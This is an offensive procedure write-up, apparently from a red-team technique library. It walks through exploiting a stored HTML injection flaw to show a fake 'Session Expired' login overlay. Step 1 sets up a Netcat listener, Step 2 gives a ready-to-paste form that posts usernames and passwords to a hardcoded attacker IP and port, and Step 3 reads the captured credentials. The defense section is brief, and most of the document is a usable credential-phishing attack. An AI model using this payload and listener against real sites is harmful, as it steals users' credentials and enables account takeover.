---
type: procedure
verified: true
submitted: true
tactics:
  - '[[Collection]]'
techniques:
  - '[[JavaScript]]'
  - '[[Domain Controller Authentication]]'
sub_techniques: []
tags:
  - html-injection
  - credential-theft
  - phishing
  - web-applications
  - impersonation
  - stored-html-injection
commands:
  - '[[commands/netcat-windows-listen-on-port]]'
platforms:
  - Web
tools:
  - '[[tools/Netcat]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
created_at: '2020-07-27T17:28:11.940127+00:00'
updated_at: '2023-05-26T01:27:30.233315+00:00'
validated: true
---

# Stored-HTML-Injection-for-Credential-Theft

## Summary

This procedure demonstrates how to exploit a stored HTML injection vulnerability in a web application to inject a fake login form that impersonates a session expiration notice. When victims interact with the form, their entered credentials are posted to an attacker-controlled listener, enabling credential theft and potential account impersonation.

## Description

Stored HTML injection occurs when user-supplied input containing HTML is stored (e.g., in a database or comment section) and later rendered without proper sanitization, allowing attackers to inject malicious HTML that executes in the context of other users' browsers. In this scenario, the injected HTML creates an overlay fake login form styled to mimic the legitimate application login, tricking users into submitting credentials to the attacker's server. This maintains persistent access as the injection remains stored and affects multiple victims. The technique relies on social engineering via impersonation and requires the target application to reflect stored input directly in HTML without escaping. It is commonly used against web forums, guestbooks, or user profile sections. Expected outcomes include capturing plaintext usernames and passwords for further exploitation, such as lateral movement or privilege escalation within the application.

## Requirements

1. Access to a web application vulnerable to stored HTML injection (e.g., a comment or profile field that renders HTML unsanitized).
2. Network connectivity where the victim's browser can reach the attacker's listener IP and port.
3. Netcat (nc.exe for Windows) installed on the attacker's machine for receiving POST data.
4. A user account or unauthenticated access to submit the injection payload.

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and sanitization using libraries like DOMPurify or HTML entity encoding to prevent HTML injection.
- Enforce Content Security Policy (CSP) headers to restrict inline scripts and form actions to trusted domains.
- Monitor for anomalous network traffic from web servers to internal or external IPs on non-standard ports.
- Use web application firewalls (WAFs) to detect and block suspicious HTML patterns in inputs.
- Enable logging of user-submitted content and review for injection attempts; educate users on recognizing phishing overlays.

## Objectives

1. Inject persistent malicious HTML to display a fake login form to victims.
2. Capture submitted credentials via POST requests to the attacker's listener.
3. Impersonate victims using stolen credentials for persistent application access.
4. Expected outcome: Obtain valid username/password pairs for target accounts.

## Instructions

### Step 1: Set Up Listener on Attacker Machine

**Context**: Before injecting the payload, start a Netcat listener to capture incoming POST requests containing credentials. This ensures the attacker can receive data when victims submit the fake form. Use a port that is reachable from the victim's network, such as 9999, and ensure no firewall blocks it.

**Command** ([[commands/netcat-windows-listen-on-port]]):
```cmd
nc.exe -lvp 9999
```

> This command binds Netcat to port 9999 in listening mode with verbose output. Expected output includes "listening on [any] 9999 ...". Keep this terminal open throughout the attack. If using a different port, adjust accordingly. Success is confirmed when the listener starts without errors and awaits connections.

### Step 2: Inject the Malicious HTML Payload

**Context**: Submit the fake login form HTML into the vulnerable stored input field (e.g., a comment box or profile description). The payload creates an absolute-positioned overlay that appears as a session expiration prompt, directing form submissions to the attacker's listener. This step requires identifying the injection point via testing (e.g., injecting <b>test</b> to confirm rendering).

**Code** ([[codes/Fake-Session-Expired-Login-Form]]):

```html
<div class="code">test</div>
<div style="position: absolute; left: 0px; top: 0px; width: 800px; height: 600px; z-index: 1000; background-color:white;">
  Session Expired, Please Login:<br>
  <form name="login" action="http://192.168.43.183:9999">
    <table>
      <tr><td>Username:</td><td><input type="text" name="uname"/></td></tr>
      <tr><td>Password:</td><td><input type="password" name="pw"/></td></tr>
    </table>
    <input type="submit" value="Login"/>
  </form>
</div>
```

> Paste the code above into the vulnerable text field and submit. The "test" div confirms injection success if bolded text appears. The overlay div positions a white box over the page with a form posting to the hardcoded attacker IP (192.168.43.183) and port (9999). Replace these with your listener details before injection. Expected output: The page renders the fake form overlay upon loading the stored content. Verify by viewing the page source or refreshing to see the injected HTML.

### Step 3: Observe Credential Capture

**Context**: Once injected, the fake form will display to any user viewing the affected page (e.g., forum thread). When a victim enters credentials and submits, the POST data (uname and pw parameters) is sent to the Netcat listener. Monitor the listener for incoming connections and data to harvest credentials.

**Command** ([[commands/netcat-windows-listen-on-port]]):
```cmd
# Listener remains running from Step 1
```

> No new command needed; observe the existing Netcat window. When a victim submits, expect a connection followed by HTTP POST data, e.g., "uname=admin&pw=secret". Log the output to a file if needed (e.g., nc.exe -lvp 9999 > creds.txt). Success indicators include receiving form data with valid-looking credentials. If no data arrives, check network reachability or injection persistence.
